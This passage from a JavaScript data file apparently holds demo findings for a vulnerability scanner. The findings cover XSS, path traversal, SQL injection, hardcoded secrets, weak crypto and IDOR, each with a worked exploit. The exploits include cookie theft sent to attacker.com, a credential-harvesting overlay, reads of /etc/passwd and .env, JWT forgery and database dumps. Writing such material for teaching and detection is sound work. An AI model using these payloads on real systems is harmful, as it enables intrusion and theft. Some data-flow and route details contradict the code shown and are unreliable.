                    language: "bash",
                },
                {
                    heading: "Session Hijacking — Cookie Exfiltration",
                    text: "Using `fetch()`, exfiltrate the victim's session cookie to an attacker-controlled server. The victim's session can then be replayed directly.",
                    code: `# Craft phishing URL (URL-encoded for distribution)
PAYLOAD='<script>fetch("https://attacker.com/c?v="+btoa(document.cookie))</script>'
URL="http://localhost:3000/hello?username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")"
echo "Phishing URL: $URL"

# Attacker server receives:
# GET /c?v=c2Vzc2lvbklkPWFiYzEyMztkb21haW49bG9jYWxob3N0 HTTP/1.1`,
                    language: "bash",
                },
                {
                    heading: "Phishing Overlay — Credential Harvesting",
                    text: "Replace the entire page DOM with a fake login form to capture the victim's plaintext credentials.",
                    code: `<img src=x onerror='
  document.body.innerHTML=`+"`"+`
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center">
      <form action="https://attacker.com/harvest" method="POST">
        <h2>Session expired — please log in again</h2>
        <input name="user" placeholder="Username" /><br/>
        <input name="pass" type="password" placeholder="Password" /><br/>
        <button type="submit">Login</button>
      </form>
    </div>`+"`"+`
'>`,
                    language: "html",
                },
            ],
            attackPath: `1. Attacker crafts a URL with a malicious <script> payload in the username parameter
2. Victim clicks the link (e.g. received via phishing email or social media)
3. Server reflects the payload unescaped into the HTML response
4. Victim's browser executes the injected JavaScript
5. Script exfiltrates session cookies to attacker's server
6. Attacker replays the cookie to hijack the victim's session`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "req.query.username", description: "Attacker-controlled GET parameter" },
                    { id: "n2", type: "intermediate", label: "template string", description: "Interpolated into HTML response body without encoding" },
                    { id: "n3", type: "sink", label: "res.send(html)", description: "Unescaped HTML sent to browser — script executes in victim context" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "unescaped" },
                    { from: "n2", to: "n3", label: "reflected" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.92,
                rounds: [
                    {
                        id: "r1", round: 1, agentRole: "advocate",
                        argument: "The username parameter is directly interpolated into HTML with no encoding. This is a textbook reflected XSS. The OWASP Top 10 explicitly identifies this pattern as A03:2021 Injection.",
                        citations: [{ excerpt: "Reflected attacks are those where the injected script is reflected off the web server, such as in an error message or search result.", source: "OWASP XSS Prevention Cheat Sheet" }],
                    },
                    {
                        id: "r2", round: 2, agentRole: "skeptic",
                        argument: "Modern browsers have built-in XSS auditors and CSP headers might be in place. The real-world impact may be limited depending on the deployment environment.",
                    },
                    {
                        id: "r3", round: 3, agentRole: "judge",
                        argument: "Chrome removed its XSS auditor in v86 and Firefox never had one. No CSP header is set in the application. The vulnerability is confirmed with High severity.",
                        verdict: "confirmed",
                        confidence: 0.92,
                    },
                ],
            },
        },
        {
            id: "demo-vuln-3",
            severity: "High",
            title: "Path Traversal",
            cweId: "CWE-22",
            lineNumber: 38,
            confidence: 0.95,
            cvssScore: 7.5,
            vulnerableCode: `// src/index.js — lines 35-41
app.get('/download', (req, res) => {
    const filename = req.query.filename;

    // Path traversal vulnerability - no validation
    const filepath = './uploads/' + filename;
    res.sendFile(filepath);
});`,
            explanation: "The `filename` parameter is appended to the file path without validation. An attacker can use `../` sequences to read arbitrary files from the server (e.g., `/etc/passwd`).",
            bestPractices: "Validate file names against an allow-list, use `path.resolve()` and verify the resolved path stays within the uploads directory.",
            details: "Path traversal via unsanitised file parameter",
            exploitExamples: `# Proof of Concept — Path Traversal (CWE-22)
# Target: GET /download?filename=<payload>

# 1. Read /etc/passwd (Linux)
curl "http://localhost:3000/download?filename=../../../../etc/passwd"

# 2. Read application source code
curl "http://localhost:3000/download?filename=../../../src/index.js"

# 3. Read environment file with secrets
curl "http://localhost:3000/download?filename=../../../.env"

# 4. URL-encoded variant (bypass naive string checks)
curl "http://localhost:3000/download?filename=..%2F..%2F..%2Fetc%2Fpasswd"`,
            attackPath: `1. Attacker discovers the /download?filename= endpoint
2. Tests with filename=../test to probe directory traversal
3. Server returns file contents — confirms traversal works
4. Chains ../ sequences to exit the uploads directory
5. Reads sensitive files: .env (secrets), /etc/shadow, source code
6. Uses extracted credentials for further compromise`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "req.query.filename", description: "Attacker-controlled filename parameter" },
                    { id: "n2", type: "intermediate", label: "path.join(uploadsDir, filename)", description: "Joined without resolving or checking traversal sequences" },
                    { id: "n3", type: "sink", label: "fs.readFile(filePath)", description: "File read from attacker-controlled path — can escape intended directory" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "unvalidated" },
                    { from: "n2", to: "n3", label: "arbitrary path" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.95,
                rounds: [
                    {
                        id: "r1", round: 1, agentRole: "advocate",
                        argument: "Direct path traversal: filename from query string is joined with the uploads directory without any normalization or boundary check. Attacker can read any file accessible to the Node process.",
                    },
                    {
                        id: "r2", round: 2, agentRole: "skeptic",
                        argument: "The OS might restrict access to sensitive files based on the user running the process. In a containerized environment the impact could be scoped.",
                    },
                    {
                        id: "r3", round: 3, agentRole: "judge",
                        argument: "Even with process-level restrictions, source code, .env files, and configuration are typically readable. The vulnerability is confirmed. Container scope does not eliminate the finding.",
                        verdict: "confirmed",
                        confidence: 0.95,
                    },
                ],
            },
        },
        {
            id: "demo-vuln-4",
            severity: "Critical",
            title: "Hardcoded Credentials",
            cweId: "CWE-798",
            lineNumber: 46,
            confidence: 0.99,
            cvssScore: 9.1,
            vulnerableCode: `// src/index.js — lines 44-51
// Vulnerable: Hardcoded credentials
const dbConfig = {
    host: 'localhost',
    user: 'admin',
    password: 'password123', // Hardcoded secret
    database: 'myapp'
};

const connection = mysql.createConnection(dbConfig);`,
            explanation: "Database password `password123` is hardcoded in the source code. Anyone with access to the repository can see these credentials.",
            bestPractices: "Store credentials in environment variables or a secrets manager. Never commit secrets to version control.",
            details: "Hardcoded database password in source code",
            exploitExamples: `# Proof of Concept — Hardcoded Credentials (CWE-798)
# Step 1: Clone or browse the public/internal repository
git clone https://github.com/org/vulnerable-express-app

# Step 2: Search for credentials directly in source
grep -r "password" src/
# Output: const DB_PASS = "password123";

# Step 3: Connect to the database using the extracted credentials
mysql -h db.internal -u admin -ppassword123 appdb

# Step 4: Dump all tables
mysqldump -u admin -ppassword123 appdb > dump.sql`,
            attackPath: `1. Attacker gains read access to the repository (public repo, insider, leak)
2. Searches for credential patterns: password, secret, key, token
3. Extracts plaintext DB credentials from src/index.js line 46
4. Connects directly to the database server using the hardcoded password
5. Dumps entire database — user records, session tokens, PII
6. Pivots to other systems reusing the same password`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "config literal", description: "Plaintext password hardcoded at line 46" },
                    { id: "n2", type: "intermediate", label: "mysql.createConnection()", description: "Credentials passed directly to DB driver" },
                    { id: "n3", type: "sink", label: "database server", description: "Full DB access granted with hardcoded credentials" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "embedded" },
                    { from: "n2", to: "n3", label: "authenticated" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "The password is literally in plaintext on line 46. Zero ambiguity. Any repository access grants full database credentials." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "If the repo is private and access-controlled, the exposure surface is limited to authorized developers." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Private repo status does not eliminate the risk — insider threat, accidental exposure, or repo compromise all lead to credential leak. Confirmed Critical.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
    "src/routes/users.js": [
        {
            id: "demo-vuln-5",
            severity: "Critical",
            title: "SQL Injection",
            cweId: "CWE-89",
            lineNumber: 6,
            confidence: 0.98,
            cvssScore: 9.8,
            vulnerableCode: `// src/routes/users.js — lines 4-10
router.get('/:id', (req, res) => {
    const query = "SELECT * FROM users WHERE id = " + req.params.id;
    db.query(query, (err, result) => {
        res.json(result);
    });
});`,
            explanation: "Route parameter `req.params.id` is concatenated directly into the SQL query, allowing injection of arbitrary SQL.",
            bestPractices: "Use parameterised queries: `db.query('SELECT * FROM users WHERE id = ?', [req.params.id], ...)`",
            details: "SQL Injection in user lookup route",
            exploitExamples: `# Proof of Concept — SQL Injection in user lookup (CWE-89)
# Target: GET /users/:id

# 1. Basic injection detection
curl "http://localhost:3000/users/1 OR 1=1--"

# 2. Extract database version
curl "http://localhost:3000/users/1 UNION SELECT version(),2,3--"

# 3. Dump all user credentials
curl "http://localhost:3000/users/0 UNION SELECT username,password,email FROM users--"`,
            attackPath: `1. Attacker discovers /users/:id endpoint via API enumeration
2. Sends id=1 OR 1=1-- — receives all user records
3. Crafts UNION SELECT to enumerate columns and tables
4. Extracts username/password pairs from the users table
5. Brute-forces or cracks hashed passwords offline
6. Logs in as admin using cracked credentials`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "req.params.id", description: "URL route parameter, attacker-controlled" },
                    { id: "n2", type: "intermediate", label: "string concat", description: "'SELECT * FROM users WHERE id = ' + req.params.id" },
                    { id: "n3", type: "sink", label: "db.query()", description: "Raw SQL string executed — injection point" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "unsanitised" },
                    { from: "n2", to: "n3", label: "injected" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.98,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "req.params.id flows directly into a string-concatenated SQL query. Trivially exploitable — UNION SELECT and boolean-based attacks both work." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Route-level validation middleware might sanitise the ID parameter before it reaches this handler." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "No validation middleware is registered on this router. Confirmed Critical SQL Injection.", verdict: "confirmed", confidence: 0.98 },
                ],
            },
        },
        {
            id: "demo-vuln-6",
            severity: "Critical",
            title: "SQL Injection",
            cweId: "CWE-89",
            lineNumber: 13,
            confidence: 0.97,
            cvssScore: 9.8,
            vulnerableCode: `// src/routes/users.js — lines 12-17
router.post('/search', (req, res) => {
    const { name } = req.body;
    const query = \`SELECT * FROM users WHERE name LIKE '%\${name}%'\`;
    db.query(query, (err, result) => {
        res.json(result);
    });
});`,
            explanation: "The `name` field from the request body is interpolated directly into a LIKE query using template literals, enabling SQL injection.",
            bestPractices: "Use parameterised queries with wildcards: `db.query('SELECT * FROM users WHERE name LIKE ?', [`%${name}%`], ...)`",
            details: "SQL Injection in user search",
            exploitExamples: `# Proof of Concept — SQL Injection in user search (CWE-89)
# Target: POST /users/search  Body: { "name": "<payload>" }

# 1. Boolean-based detection
curl -X POST http://localhost:3000/users/search \\
  -H "Content-Type: application/json" \\
  -d '{"name": "' OR '1'='1"}'

# 2. Exfiltrate data via UNION
curl -X POST http://localhost:3000/users/search \\
  -H "Content-Type: application/json" \\
  -d '{"name": "x%' UNION SELECT username,password,3 FROM users-- -"}'`,
            attackPath: `1. Attacker finds POST /users/search endpoint
2. Sends name=x%' OR 1=1-- to retrieve all users
3. Uses UNION SELECT to read from arbitrary tables
4. Extracts admin credentials and session tokens
5. Escalates privileges using extracted admin account`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "req.body.name", description: "POST body field, attacker-controlled" },
                    { id: "n2", type: "intermediate", label: "template literal", description: "`SELECT * FROM users WHERE name LIKE '%${name}%'`" },
                    { id: "n3", type: "sink", label: "db.query()", description: "Unsanitised template string executed as SQL" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "interpolated" },
                    { from: "n2", to: "n3", label: "injected" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.97,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Template literal interpolation into a LIKE clause is a classic second-order injection vector. No escaping, no parameterisation." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The LIKE wildcard context might limit some payloads." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "The LIKE context does not prevent UNION or boolean-based attacks. Confirmed Critical.", verdict: "confirmed", confidence: 0.97 },
                ],
            },
        },
    ],
    "src/routes/auth.js": [
        {
            id: "demo-vuln-7",
            severity: "High",
            title: "Weak Cryptographic Hash (MD5)",
            cweId: "CWE-328",
            lineNumber: 9,
            confidence: 0.99,
            cvssScore: 7.5,
            vulnerableCode: `// src/routes/auth.js — lines 7-14
router.post('/login', (req, res) => {
    const { username, password } = req.body;

    // VULNERABLE: Using MD5 - cryptographically weak
    const hash = crypto.createHash('md5').update(password).digest('hex');

    const user = users.find(u => u.username === username);
    if (user && user.passwordHash === hash) {
        req.session.userId = user.id;
        res.json({ success: true });
    }
});`,
            explanation: "MD5 is cryptographically broken and unsuitable for password hashing. It is vulnerable to collision and preimage attacks, and rainbow table lookups.",
            bestPractices: "Use bcrypt, scrypt, or Argon2 for password hashing with a per-user salt.",
            details: "Passwords hashed with MD5 instead of a modern KDF",
            exploitExamples: `# Proof of Concept — MD5 Password Cracking (CWE-328)
# Step 1: Extract hashed passwords (via SQL injection or DB dump)
# Example hash: 5f4dcc3b5aa765d61d8327deb882cf99 (= "password")

# Step 2: Crack with hashcat (GPU-accelerated)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
# Typical rate: 10+ billion MD5 hashes/second on modern GPU

# Step 3: Crack with online rainbow tables
# https://crackstation.net — cracks most MD5 hashes instantly

# Step 4: Use cracked password to authenticate
curl -X POST http://localhost:3000/auth/login \\
  -d '{"username":"admin","password":"password"}'`,
            attackPath: `1. Attacker obtains MD5 password hashes via SQL injection or DB breach
2. Submits hashes to CrackStation — most common passwords crack instantly
3. Runs hashcat with rockyou.txt wordlist for remaining hashes
4. Achieves ~90% cracking rate within minutes on consumer hardware
5. Logs in as cracked users and escalates to admin`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "password (plaintext)", description: "User-provided password during registration/login" },
                    { id: "n2", type: "intermediate", label: "md5(password)", description: "MD5 hash computed — no salt, no work factor" },
                    { id: "n3", type: "sink", label: "users table", description: "Weak hash stored — crackable offline in seconds" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "hashed (MD5)" },
                    { from: "n2", to: "n3", label: "stored" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "MD5 is documented as broken since 2004. NIST explicitly prohibits it for password hashing. No salt means rainbow tables crack it in milliseconds." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "If passwords are complex and long, MD5 resistance may be higher in practice." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Password strength doesn't compensate for algorithmic weakness at GPU cracking speeds. Confirmed High — upgrade to bcrypt/argon2 immediately.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
    "src/routes/admin.js": [
        {
            id: "demo-vuln-8",
            severity: "High",
            title: "Missing Authorization",
            cweId: "CWE-862",
            lineNumber: 5,
            confidence: 0.99,
            cvssScore: 8.2,
            vulnerableCode: `// src/routes/admin.js — lines 4-9
// VULNERABLE: Missing authorization check
router.get('/users', (req, res) => {
    db.query('SELECT * FROM users', (err, result) => {
        res.json(result);
    });
});`,
            explanation: "The admin `/users` endpoint has no authentication or authorization middleware. Any unauthenticated user can list all users in the database.",
            bestPractices: "Add authentication middleware and verify the user has admin privileges before serving admin routes.",
            details: "Admin endpoint accessible without authentication",
            exploitExamples: `# Proof of Concept — Missing Authorization (CWE-862)
# No credentials required — endpoint is completely open

# List all users in the database
curl http://localhost:3000/admin/users

# Response: full user list with emails, password hashes, admin flags
# [{"id":1,"username":"admin","email":"admin@app.com","password_hash":"...","is_admin":true}, ...]`,
            attackPath: `1. Attacker discovers /admin/users via directory brute-force or sitemap
2. Sends unauthenticated GET request — receives full user list
3. Extracts admin email addresses and password hashes
4. Uses data for targeted phishing or offline password cracking
5. Admin account compromised → full application takeover`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "unauthenticated request", description: "Any HTTP client, no token required" },
                    { id: "n2", type: "intermediate", label: "Express router (no middleware)", description: "Request reaches handler with zero authorization checks" },
                    { id: "n3", type: "sink", label: "db.query('SELECT * FROM users')", description: "All user records returned to unauthenticated caller" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "no auth check" },
                    { from: "n2", to: "n3", label: "unrestricted" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "The admin router has no authentication or authorization middleware. Any unauthenticated request to /admin/users returns the full user table." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Network-level controls like IP whitelisting might restrict access to the admin path in production." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Application-layer authorization must not depend on network-layer assumptions. This is a confirmed High severity missing authorization vulnerability.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
        {
            id: "demo-vuln-9",
            severity: "High",
            title: "Insecure Direct Object Reference (IDOR)",
            cweId: "CWE-639",
            lineNumber: 12,
            confidence: 0.95,
            cvssScore: 7.1,
            vulnerableCode: `// src/routes/admin.js — lines 11-16
// VULNERABLE: IDOR — no ownership or privilege check
router.delete('/user/:id', (req, res) => {
    const { id } = req.params;
    db.query('DELETE FROM users WHERE id = ?', [id], (err) => {
        res.json({ deleted: true });
    });
});`,
            explanation: "The delete endpoint accepts a user ID directly from the URL without verifying the requester's authority to delete that specific user.",
            bestPractices: "Verify the authenticated user has permission to perform the action on the specific resource.",
            details: "IDOR in user deletion endpoint",
            exploitExamples: `# Proof of Concept — IDOR in user deletion (CWE-639)
# Attacker is authenticated as user ID 42

# Delete a different user's account (user ID 1 = admin)
curl -X DELETE http://localhost:3000/admin/users/1 \\
  -H "Authorization: Bearer <attacker_token>"

# Response: {"message": "User deleted"}
# Admin account removed — application in degraded state`,
            attackPath: `1. Attacker authenticates as a normal user
2. Observes DELETE /admin/users/:id endpoint
3. Tries deleting user ID 1 (admin) — succeeds without privilege check
4. Deletes competing accounts or the admin account
5. Creates denial-of-service or escalates via account manipulation`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "req.params.id", description: "Target user ID from URL — fully attacker-controlled" },
                    { id: "n2", type: "intermediate", label: "no ownership check", description: "Handler skips: does req.user.id === target or is req.user.admin?" },
                    { id: "n3", type: "sink", label: "db.query(DELETE FROM users)", description: "Arbitrary user deleted based on attacker-supplied ID" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "unchecked" },
                    { from: "n2", to: "n3", label: "unauthorized delete" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.95,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "The handler performs no ownership or role check. Authenticated user can delete any account including admin." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "If users can only reach this endpoint through authenticated flows, the attack surface is narrower." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Authentication ≠ authorization. Any authenticated user exploits this. Confirmed High IDOR.", verdict: "confirmed", confidence: 0.95 },
                ],
            },
        },
    ],
    "src/utils/database.js": [
        {
            id: "demo-vuln-10",
            severity: "Critical",
            title: "Hardcoded Credentials",
            cweId: "CWE-798",
            lineNumber: 5,
            confidence: 0.99,
            cvssScore: 9.1,
            vulnerableCode: `// src/utils/database.js — lines 3-8
const connection = mysql.createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: 'root',
    password: 'admin123', // SECURITY ISSUE: Hardcoded password
    database: 'production_db'
});`,
            explanation: "The root database password `admin123` is hardcoded in the source code with a comment acknowledging the issue.",
            bestPractices: "Use environment variables: `password: process.env.DB_PASSWORD`",
            details: "Hardcoded database root password",
            exploitExamples: `# Proof of Concept — Hardcoded DB Root Password (CWE-798)
# Found in src/utils/database.js:
# const db = mysql.createConnection({ user: 'root', password: 'admin123' });

# Direct database access with extracted credentials
mysql -h db.internal -u root -padmin123

# Full database control: read, write, drop tables
mysql> SHOW DATABASES;
mysql> SELECT * FROM users;
mysql> DROP TABLE users; -- destructive`,
            attackPath: `1. Repository code is reviewed (employee, auditor, or attacker with access)
2. root credentials extracted from src/utils/database.js line 5
3. Attacker connects to database as root — full privileges
4. Reads all tables: users, sessions, transactions, PII
5. Can drop tables, create backdoor accounts, or exfiltrate entire DB`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "'admin123' literal", description: "Root password hardcoded in DB utility module" },
                    { id: "n2", type: "intermediate", label: "mysql.createConnection()", description: "Root credentials passed to MySQL driver" },
                    { id: "n3", type: "sink", label: "MySQL root session", description: "Full database administrative access granted" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "embedded" },
                    { from: "n2", to: "n3", label: "root access" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Root credentials hardcoded with a self-incriminating comment ('TODO: move to env'). Immediately exploitable." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Database port might not be exposed externally." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Internal exposure is sufficient for insider threat or post-breach lateral movement. Confirmed Critical.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
    "src/utils/crypto.js": [
        {
            id: "demo-vuln-11",
            severity: "Critical",
            title: "Weak Encryption Algorithm (DES-ECB)",
            cweId: "CWE-327",
            lineNumber: 4,
            confidence: 0.98,
            cvssScore: 7.5,
            vulnerableCode: `// src/utils/crypto.js — lines 4-10
// VULNERABLE: Weak encryption
const ALGORITHM = 'des-ecb';
const KEY = 'mysecret';

function encrypt(text) {
    const cipher = crypto.createCipheriv(ALGORITHM, KEY, null);
    return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
}`,
            explanation: "DES is a deprecated algorithm with only 56-bit key strength. ECB mode does not use an IV and reveals patterns in the plaintext.",
            bestPractices: "Use AES-256-GCM or AES-256-CBC with a random IV for encryption.",
            details: "Encryption uses deprecated DES-ECB cipher",
            exploitExamples: `# Proof of Concept — DES-ECB Weakness (CWE-327)
# DES 56-bit key brute-force (EFF DES Cracker, 1998: 22 hours)
# Modern GPU clusters: < 1 hour

# ECB mode pattern leakage demo:
# Two identical 8-byte plaintext blocks → identical ciphertext blocks
python3 -c "
from Crypto.Cipher import DES
key = b'AAAAAAAA'  # weak key
cipher = DES.new(key, DES.MODE_ECB)
pt = b'ADMIN   ADMIN   '  # two identical blocks
ct = cipher.encrypt(pt)
print(ct.hex())  # first 8 bytes == last 8 bytes — pattern revealed
"`,
            attackPath: `1. Attacker intercepts encrypted ciphertext from the application
2. Identifies DES-ECB from block size (8 bytes) and repeated ciphertext blocks
3. Launches brute-force attack — 56-bit key space exhausted in < 1 hour
4. Decrypts all captured data retroactively
5. Access to encrypted PII, session data, and internal payloads`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "plaintext data", description: "Sensitive data to be encrypted (PII, session, tokens)" },
                    { id: "n2", type: "intermediate", label: "DES-ECB cipher", description: "56-bit key, no IV — broken algorithm and mode" },
                    { id: "n3", type: "sink", label: "ciphertext output", description: "Weak ciphertext brute-forceable and pattern-leaking" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "encrypted (DES)" },
                    { from: "n2", to: "n3", label: "weak output" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.98,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "DES was broken in 1998. ECB mode additionally leaks structural patterns. Both issues are independently disqualifying." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "If the encrypted data is low-sensitivity, the risk might be acceptable." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "The severity depends on what's encrypted but the algorithm must be replaced regardless. Confirmed Critical.", verdict: "confirmed", confidence: 0.98 },
                ],
            },
        },
        {
            id: "demo-vuln-12",
            severity: "Medium",
            title: "Insecure Random Number Generation",
            cweId: "CWE-338",
            lineNumber: 11,
            confidence: 0.93,
            cvssScore: 5.3,
            vulnerableCode: `// src/utils/crypto.js — lines 11-13
function generateToken() {
    return Math.random().toString(36).substring(2);
}`,
            explanation: "`Math.random()` is not cryptographically secure. Tokens generated this way are predictable and can be guessed by an attacker.",
            bestPractices: "Use `crypto.randomBytes(32).toString('hex')` for cryptographically secure token generation.",
            details: "Token generation uses Math.random()",
            exploitExamples: `# Proof of Concept — Predictable Token (CWE-338)
# V8's Math.random() uses xorshift128+ — predictable from 5 sequential outputs

# Step 1: Observe 5 reset tokens from the application
# (e.g., generate 5 password reset tokens as an attacker-controlled account)

# Step 2: Reconstruct internal RNG state
# Tool: https://github.com/nicowillis/xorshift128plus-predictor
node predict.js <token1> <token2> <token3> <token4> <token5>
# Output: next_token = "7f3a9c2b..."

# Step 3: Use predicted token to reset victim's password`,
            attackPath: `1. Attacker registers 5 accounts and requests password reset for each
2. Collects the 5 reset tokens (known Math.random() outputs)
3. Uses xorshift128+ predictor to reconstruct V8 RNG internal state
4. Predicts the next N tokens generated by the server
5. Requests password reset for victim account
6. Uses predicted token to reset victim's password`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "Math.random()", description: "Non-CSPRNG — predictable output" },
                    { id: "n2", type: "intermediate", label: "token = Math.random().toString(36)", description: "Token derived directly from predictable seed" },
                    { id: "n3", type: "sink", label: "password reset / session token", description: "Guessable token used for security-sensitive operation" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "predictable" },
                    { from: "n2", to: "n3", label: "weak token" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.93,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Math.random() uses xorshift128+ which is fully predictable from 5 observed outputs. Security tokens must use crypto.randomBytes()." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The attack requires observing multiple tokens from the same server process. That may not always be feasible." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "The token observation requirement is low-friction for an attacker with multiple accounts. Confirmed Medium.", verdict: "confirmed", confidence: 0.93 },
                ],
            },
        },
    ],
    "src/middleware/auth.js": [
        {
            id: "demo-vuln-13",
            severity: "Critical",
            title: "Hardcoded JWT Secret",
            cweId: "CWE-798",
            lineNumber: 3,
            confidence: 0.99,
            cvssScore: 9.8,
            vulnerableCode: `// src/middleware/auth.js — lines 3-12
const JWT_SECRET = 'super-secret-key-123';

function verifyToken(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });

    try {
        req.user = jwt.verify(token, JWT_SECRET);
        next();
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
}`,
            explanation: "The JWT signing secret `super-secret-key-123` is hardcoded. An attacker who discovers this secret can forge valid authentication tokens.",
            bestPractices: "Store the JWT secret in an environment variable and rotate it regularly.",
            details: "JWT secret hardcoded in source code",
            exploitExamples: `# Proof of Concept — JWT Forgery (CWE-798)
# Secret discovered: "super-secret-key-123"

# Forge a JWT for any user (including admin)
node -e "
const jwt = require('jsonwebtoken');
const forged = jwt.sign(
  { userId: 1, username: 'admin', isAdmin: true },
  'super-secret-key-123',
  { expiresIn: '365d' }
);
console.log(forged);
"

# Use forged token to access admin APIs
curl http://localhost:3000/admin/users \\
  -H "Authorization: Bearer <forged_token>"`,
            attackPath: `1. Attacker reads JWT secret from src/middleware/auth.js line 3
2. Signs arbitrary JWT payload: { userId: 1, isAdmin: true }
3. Uses forged token in Authorization header on any API endpoint
4. Server validates signature — token accepted as legitimate
5. Full admin API access without any valid credentials`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "'super-secret-key-123'", description: "JWT signing secret hardcoded in source" },
                    { id: "n2", type: "intermediate", label: "jwt.sign(payload, secret)", description: "Attacker uses extracted secret to sign arbitrary payload" },
                    { id: "n3", type: "sink", label: "jwt.verify() passes", description: "Forged token accepted — attacker impersonates any user" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "extracted" },
                    { from: "n2", to: "n3", label: "forged token" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Known JWT secret = complete authentication bypass. Attacker can impersonate any user including admin with a trivial 3-line script." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "If the secret hasn't leaked externally yet, the window of exposure may be small." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "It's in version control — it has already leaked. Confirmed Critical. Rotate the secret immediately.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
    "config/secrets.js": [
        {
            id: "demo-vuln-14",
            severity: "Critical",
            title: "Exposed Cloud Credentials",
            cweId: "CWE-798",
            lineNumber: 3,
            confidence: 0.99,
            cvssScore: 9.9,
            vulnerableCode: `// config/secrets.js — lines 1-6
// VULNERABLE: Secrets in source code
module.exports = {
    AWS_ACCESS_KEY: 'AKIA_EXAMPLE_KEY_HERE',
    AWS_SECRET_KEY: 'example_secret_key_replace_me_in_production',
    JWT_SECRET: 'super-secret-jwt-key-do-not-share'
};`,
            explanation: "AWS access keys are committed to source control. These credentials could be used to access cloud resources, incur charges, or exfiltrate data.",
            bestPractices: "Use IAM roles, environment variables, or a secrets manager. Never commit cloud credentials to version control. Rotate any exposed keys immediately.",
            details: "AWS credentials exposed in source code",
            exploitExamples: `# Proof of Concept — AWS Credential Abuse (CWE-798)
# Keys extracted from config/secrets.js:
# AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
# AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Configure AWS CLI with stolen credentials
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
